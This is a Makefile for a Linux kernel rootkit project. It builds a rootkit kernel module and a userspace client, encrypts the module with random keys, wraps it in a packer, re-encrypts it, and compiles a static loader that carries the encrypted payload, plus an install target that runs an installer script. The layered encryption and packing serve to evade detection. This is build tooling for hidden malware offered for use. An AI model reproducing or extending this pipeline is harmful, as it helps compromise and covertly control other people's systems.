CC := gcc
RM = rm -rf
SHELL := /bin/bash
PWD := $(shell pwd)

KERNEL := /lib/modules/5.15.142/build

#make -C <path_to_kernel_src> M=$PWD


CLIENT_DIR ?= $(PWD)/userspace

CONFIG_SCRIPT ?= $(PWD)/scripts/kconfig/config.sh

CONFIG_FILE ?= $(PWD)/.config

GEN_RANDOM ?= $(PWD)/scripts/random.sh

BUILD_DIR ?= $(PWD)/output

BUILD_DIR_MAKEFILE ?= $(BUILD_DIR)/Makefile

MODULE_DIR ?= $(PWD)/kernelspace/rk

ENCRYPT_SRC ?= $(PWD)/kernelspace/encrypt/encrypt.c
ENCRYPT ?= $(BUILD_DIR)/encrypt
PACKER_DIR ?= $(PWD)/kernelspace/packer
ROOTKIT ?= $(BUILD_DIR)/rootkit.ko
RAND1 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')
RAND2 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')

INCLUDE ?= -I$(PWD)/kernelspace/rk/header_files
LOADER ?= $(PWD)/kernelspace/loader/loader.c

INSTALLER ?= $(PWD)/scripts/installer.sh


all: $(BUILD_DIR_MAKEFILE) userland_bin $(ENCRYPT) module_rootkit packer loader

#$<  == loader.c
loader: $(LOADER)
	@ $(ENCRYPT) $(BUILD_DIR)/rootkit_packed.ko $(RAND2) > $(BUILD_DIR)/rootkit_packed.ko.enc
	@ echo "  CC      $(BUILD_DIR)/$@"
	@ $(CC) $(INCLUDE) -I$(BUILD_DIR) -static $< -o $(BUILD_DIR)/$@

packer:
	@ $(ENCRYPT) $(ROOTKIT) $(RAND1) > $(BUILD_DIR)/rootkit.ko.enc
	@ $(MAKE) -C $(KERNEL) M=$(BUILD_DIR) src=$(PACKER_DIR)

module_rootkit:
	@ $(MAKE) -C $(KERNEL) M=$(BUILD_DIR) src=$(MODULE_DIR)

$(ENCRYPT): $(ENCRYPT_SRC)
	@ echo "  CC      $(ENCRYPT)"
	@ $(CC) $(INCLUDE) -std=c99 $< -o $@

$(BUILD_DIR):
	@ mkdir -p $(BUILD_DIR)

$(BUILD_DIR_MAKEFILE): $(BUILD_DIR)
	@ touch $@

#config
config:
	@$(MAKE) -f scripts/Makefile $@
	@ $(SHELL) $(GEN_RANDOM) $(CONFIG_FILE)

#match all ending with config like menuconfig
%config:
	@$(MAKE) -f scripts/Makefile $@
	@ $(SHELL) $(GEN_RANDOM) $(CONFIG_FILE)

userland_bin:
	@ $(MAKE) -C $(CLIENT_DIR)

install:
	@ $(SHELL) $(INSTALLER)


.PHONY : clean module_rootkit config

clean:
	@ $(RM) $(BUILD_DIR) $(CONFIG_FILE)
